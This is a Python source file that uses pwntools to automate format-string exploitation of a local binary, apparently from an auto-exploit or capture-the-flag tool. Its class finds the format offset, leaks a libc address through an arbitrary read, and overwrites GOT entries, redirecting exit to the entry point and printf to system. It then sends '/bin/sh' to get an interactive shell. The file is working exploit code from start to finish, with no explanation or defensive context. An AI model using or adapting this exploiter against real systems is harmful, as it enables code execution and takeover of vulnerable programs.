from pwn import *
from subprocess import Popen, PIPE, check_output

context.log_level = 'DEBUG'


class FmtExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.output = b""
        self.last_output = b""
        self.exploit_input = []
        self.position = 0
        self.length = 0
        self.fmt_offset = None
        self.parse_vuln(vuln_details)

    def parse_vuln(self, vuln_details):
        print(vuln_details)
        self.position = vuln_details["position"]
        self.length = vuln_details["length"]
        self.exploit_input = vuln_details["input"]
        self.output = vuln_details["output"]

    def send_payload(self, payload):
        process = self.binary.elf.process()
        self.apply_exploit_input(process, payload)
        output = process.clean()
        log.info("fmt message: {}".format(output))
        return output

    def find_fmt_offset(self):
        fmt = FmtStr(self.send_payload, numbwritten=self.position)
        return fmt.offset

    def apply_fmt(self):


        process = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break main''')
        payload = fmtstr_payload(self.fmt_offset, {self.binary.elf.got['exit']: self.binary.elf.entry}, numbwritten=self.position)
        self.apply_exploit_input(process, payload)

        payload = fmtstr_payload(self.fmt_offset, {self.binary.elf.got['printf']: self.binary.find_function('system')},
                                 numbwritten=self.position)
        self.apply_exploit_input(process, payload)

        self.apply_exploit_input(process, b"/bin/sh\n")

        process.interactive()

    def apply_fmt1(self):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset

        proc = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break vuln''')
        self.arbitrary_write({self.binary.elf.got['exit']: self.binary.elf.entry}, proc)
        print("fgets got addr:", pack(self.binary.elf.got['fgets']))

        self.arbitrary_read(self.binary.elf.got['fgets'], proc)

        self.arbitrary_write({self.binary.elf.got['printf']: self.binary.find_function('system', True)}, proc)

        self.apply_exploit_input(proc, b"/bin/sh\n")

        proc.interactive()

    def arbitrary_read(self, address, proc=None):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset
        off_fmt = '|%{}$s|'.format(self.fmt_offset + 1).encode()
        payload = flat(
            off_fmt.rjust(context.bytes + 1),
            # b'||||||||',
            pack(address).ljust(context.bytes)
        )

        if proc is None:
            proc = self.binary.elf.process()
        proc.clean()
        proc.send(b'magic1aa')

        # self.apply_exploit_input(proc, payload)
        proc.sendline(payload)

        data = proc.clean()
        print("data:", data)

        leak_bytes = data.split(b'|')[1].rstrip().ljust(8, b'\x00')
        leak = unpack(leak_bytes)
        self.binary.adjust_libc_base(leak, 'fgets')
        # process.interactive()

    def arbitrary_write(self, write_dict, proc=None):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset
        if proc is None:
            proc = self.binary.elf.process()
        payload = fmtstr_payload(self.fmt_offset, write_dict,
                                 numbwritten=self.position)
        self.apply_exploit_input(proc, payload)
        proc.clean()

    def trim_input(self, input):
        input = input.replace(b'\x00', b'')
        ip = b"F" * self.binary.elf.bytes
        chain_length = len(input)
        log.info("total payload length: {}".format(chain_length))
        offset = input.index(ip)
        log.info("buffer offset: {}".format(offset))
        return input[0:offset]

    def apply_exploit_input(self, process, payload):
        current_output = b""
        for i, input in enumerate(self.exploit_input):
            current_output += process.clean()
            ip = b"F" * self.binary.elf.bytes
            if ip not in input:
                process.send(input)
            else:
                exploit_payload = [
                    self.trim_input(input),
                    payload
                ]
                exploit_payload = b"".join(exploit_payload)
                process.sendline(exploit_payload)

        log.info("current output: {}".format(current_output))

